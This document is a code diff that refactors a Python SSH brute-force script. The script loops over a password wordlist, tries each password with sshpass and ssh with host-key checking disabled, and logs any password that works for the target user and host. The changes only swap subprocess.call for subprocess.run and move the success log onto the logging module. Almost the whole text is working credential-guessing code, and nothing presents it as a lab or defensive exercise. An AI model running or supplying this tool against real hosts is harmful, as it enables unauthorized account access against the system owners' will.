@@ -4,6 +4,10 @@ import os
 import sys
 import time
 import requests
+import logging
+
+logging.basicConfig(filename='bruteforce_success.log', level=logging.INFO, 
+                    format='%(asctime)s - %(levelname)s - %(message)s')
 
 def get_ip_address(domain):
     try:
@@ -26,22 +30,20 @@ def brute_force(ip_address, username, wordlist_path):
         print("Error: Wordlist file is not readable!")
         sys.exit(1)
 
-    if subprocess.call(["which", "sshpass"], stdout=subprocess.PIPE, stderr=subprocess.PIPE) != 0:
+    if subprocess.run(["which", "sshpass"], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode != 0:
         print("Error: sshpass is not installed. Please install it and try again.")
         sys.exit(1)
 
-    logfile = "bruteforce_success.log"
     with open(wordlist_path, 'r') as wordlist:
         for password in wordlist:
             password = password.strip()
             print(f"Trying password: {password}")
-            result = subprocess.call(["sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5", f"{username}@{ip_address}", "exit"])
-            if result == 0:
+            result = subprocess.run(["sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5", f"{username}@{ip_address}", "exit"])
+            if result.returncode == 0:
                 print(f"Password found: {password}")
-                with open(logfile, 'a') as log:
-                    log.write(f"[{subprocess.getoutput('date')}] Password found for {username}@{ip_address}: {password}\n")
+                logging.info(f"Password found for {username}@{ip_address}: {password}")
                 sys.exit(0)
-            elif result == 5:
+            elif result.returncode == 5:
                 print("Connection refused or timeout")
                 sys.exit(1)
             time.sleep(1)
